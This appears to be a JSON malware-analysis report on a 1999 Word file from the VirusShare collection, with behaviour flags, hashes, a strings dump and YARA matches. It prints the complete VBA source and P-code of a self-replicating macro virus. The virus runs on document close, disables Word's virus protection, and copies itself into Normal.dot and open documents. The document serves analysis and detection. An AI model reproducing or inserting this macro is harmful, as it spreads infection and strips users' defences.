{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Document_Close": "Runs when the Word document is closed",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "codemodule": "May attempt to modify the VBA code"
        },
        "macro": "Private Sub Document_Close()\n    On Error Resume Next\n    Options.VirusProtection = False\n    EnableCancelKey = wdCancelDisabled\n    Set maci = MacroContainer.VBProject.VBComponents.Item(1)\n    Set macic = maci.codemodule\n    ns$ = Left(macic.lines(1, 1), 21)\n    Set inf = NormalTemplate: nsi$ = ns$ + \"Close()\"\n        If MacroContainer = inf Then Set inf = ActiveDocument: nsi$ = ns$ + \"Open()\"\n    Set infc = inf.VBProject.VBComponents\n    Set infi = infc.Item(1)\n    Set infic = infi.codemodule\n    infi.Name = \"ThisDocument\"\n    For mx = 2 To infc.Count\n        infc.Remove infc.Item(2)\n    Next mx\n        If infic.countlines <> macic.countoflines Then\n            infic.deletelines 1, infic.countoflines\n            For coco = 1 To macic.countoflines\n                infic.insertlines coco, macic.lines(coco, 1)\n            Next coco\n            infic.replaceline 1, nsi$\n        End If\n    If Left(ActiveDocument.Name, 8) <> Mid$(macic.lines(1, 1), 13, 8) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName\n    EnableCancelKey = wdCancelDisabled\nEnd Sub\n'ThisDocument v 1.0 1999\n\n\n' Processing file: VirusShare_03701bd52ad2eb6bd4a0d3ff37dd8026\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 2764 bytes\n' Line #0:\n' \tFuncDefn (Private Sub Document_Close())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #3:\n' \tLd wdCancelDisabled \n' \tSt EnableCancelKey \n' Line #4:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet maci \n' Line #5:\n' \tSetStmt \n' \tLd maci \n' \tMemLd codemodule \n' \tSet macic \n' Line #6:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd macic \n' \tArgsMemLd lines 0x0002 \n' \tLitDI2 0x0015 \n' \tArgsLd LBound 0x0002 \n' \tSt ns$ \n' Line #7:\n' \tSetStmt \n' \tLd NormalTemplate \n' \tSet inf \n' \tBoS 0x0000 \n' \tLd ns$ \n' \tLitStr 0x0007 \"Close()\"\n' \tAdd \n' \tSt nsi$ \n' Line #8:\n' \tLd MacroContainer \n' \tLd inf \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd ActiveDocument \n' \tSet inf \n' \tBoS 0x0000 \n' \tLd ns$ \n' \tLitStr 0x0006 \"Open()\"\n' \tAdd \n' \tSt nsi$ \n' \tEndIf \n' Line #9:\n' \tSetStmt \n' \tLd inf \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tSet infc \n' Line #10:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd infc \n' \tArgsMemLd Item 0x0001 \n' \tSet infi \n' Line #11:\n' \tSetStmt \n' \tLd infi \n' \tMemLd codemodule \n' \tSet infic \n' Line #12:\n' \tLitStr 0x000C \"ThisDocument\"\n' \tLd infi \n' \tMemSt New \n' Line #13:\n' \tStartForVariable \n' \tLd mx \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLd infc \n' \tMemLd Count \n' \tFor \n' Line #14:\n' \tLitDI2 0x0002 \n' \tLd infc \n' \tArgsMemLd Item 0x0001 \n' \tLd infc \n' \tArgsMemCall Remove 0x0001 \n' Line #15:\n' \tStartForVariable \n' \tLd mx \n' \tEndForVariable \n' \tNextVar \n' Line #16:\n' \tLd infic \n' \tMemLd countlines \n' \tLd macic \n' \tMemLd countoflines \n' \tNe \n' \tIfBlock \n' Line #17:\n' \tLitDI2 0x0001 \n' \tLd infic \n' \tMemLd countoflines \n' \tLd infic \n' \tArgsMemCall deletelines 0x0002 \n' Line #18:\n' \tStartForVariable \n' \tLd coco \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd macic \n' \tMemLd countoflines \n' \tFor \n' Line #19:\n' \tLd coco \n' \tLd coco \n' \tLitDI2 0x0001 \n' \tLd macic \n' \tArgsMemLd lines 0x0002 \n' \tLd infic \n' \tArgsMemCall insertlines 0x0002 \n' Line #20:\n' \tStartForVariable \n' \tLd coco \n' \tEndForVariable \n' \tNextVar \n' Line #21:\n' \tLitDI2 0x0001 \n' \tLd nsi$ \n' \tLd infic \n' \tArgsMemCall replaceline 0x0002 \n' Line #22:\n' \tEndIfBlock \n' Line #23:\n' \tLd ActiveDocument \n' \tMemLd New \n' \tLitDI2 0x0008 \n' \tArgsLd LBound 0x0002 \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd macic \n' \tArgsMemLd lines 0x0002 \n' \tLitDI2 0x000D \n' \tLitDI2 0x0008 \n' \tArgsLd Mid$$ 0x0003 \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tEndIf \n' Line #24:\n' \tLd wdCancelDisabled \n' \tSt EnableCancelKey \n' Line #25:\n' \tEndSub \n' Line #26:\n' \tQuoteRem 0x0000 0x0017 \"ThisDocument v 1.0 1999\"\n' Line #27:\n"
    },
    "filename": "VirusShare_03701bd52ad2eb6bd4a0d3ff37dd8026",
    "filesize": 27648,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: tp02268, Template: Normal.dot, Last Saved By: tp02268, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 04:00, Create Time/Date: Wed Apr 28 17:39:00 1999, Last Saved Time/Date: Wed Apr 28 17:43:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "03701bd52ad2eb6bd4a0d3ff37dd8026",
        "sha1": "4e5905b182384806eabd6b15f36e4aa5f525a6fa",
        "sha256": "7455e8b6b8a0c54253e06f1b6f5abca6900c67a491599ef9b5c7c6b5dd3296d9"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjWW",
            "/ =!",
            "'4f+4f",
            "tp02268",
            "Normal.dot",
            "tp02268",
            "Microsoft Word 8.0",
            "Lockheed Martin",
            "Title",
            "_PID_GUID",
            "Close()",
            "ThisDocument ",
            "ThisDocument v 1.0 1999",
            "Open()",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "t_Cl",
            "On Error Res",
            "  Next",
            "ions.Vir",
            "usProtecO",
            "En7C",
            "ancelKey",
            "&Set ma",
            "Macro",
            "Container.VB-j-",
            "@Compons.Item(1",
            "\".codemodul",
            "Left\"(",
            "c.l-s(",
            "1, 1), 2q#inf",
            "V:0 nsiA",
            "Then \u02c1'",
            "AHveEZ",
            "Open()D",
            ".%6F",
            "mx32 ",
            "To @",
            "c.Co\\unDA",
            "\\v6e",
            "gA mx*",
            "ic@\"c",
            "Bb <>",
            "o>fC",
            "delete",
            "A0coco01;0c",
            "insert",
            "re u`aO  ",
            "End If",
            "$U+F4, 8B)",
            "&Mid$Y1",
            "SaveAs File!>:=",
            "Full",
            "') v 1.0",
            " 1999",
            "437273a08",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Document_Close7\\",
            "Documentj",
            "Options",
            "VirusProtectionoD",
            "EnableCancelKey",
            "wdCancelDisabled{",
            "maci+",
            "MacroContainer>",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "macic",
            "codemodule",
            "nsn^",
            "lines",
            "inf3",
            "NormalTemplateq",
            "ActiveDocument\\",
            "infcZ",
            "infiZ",
            "infic\"",
            "mxN^",
            "Count0v",
            "Remove\u03f1",
            "countlines_",
            "countoflines!\\",
            "deletelines",
            "coco\u07fd",
            "insertlines",
            "replaceline",
            "_B_str_ns6",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINNT\\S",
            "ystem32\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "FB75CD8",
            "FAA72-11D2-99F3",
            "C04FC441",
            "3.TWD",
            "#Microso(ft ",
            " Libra",
            "PE0B1",
            "B5B2-FD8\"7",
            "PA05",
            "PTEMP\\VBE\\&",
            "EX&.E",
            "CvN@Sa*lCvNRav",
            "j )\t*C",
            "Of(ficDO@f",
            "G{2DF8D0",
            "4C-5BFA-",
            "101B-BDE;AA@4",
            "\\\\ORL40050\\APPS<OFFICE\\",
            "\\mso97.d",
            " 8.0ERg",
            "ThisD",
            "ocument",
            "ThisDocument",
            "ID=\"{FF7712C7-FD88-11D2-9A05-00C04FC441BB}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"B9BB58985C985C985C985C\"",
            "DPB=\"727093E84DE94DE94D\"",
            "GC=\"2B29CAB382B482B47D\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=44, 44, 611, 509, Z",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.306717",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
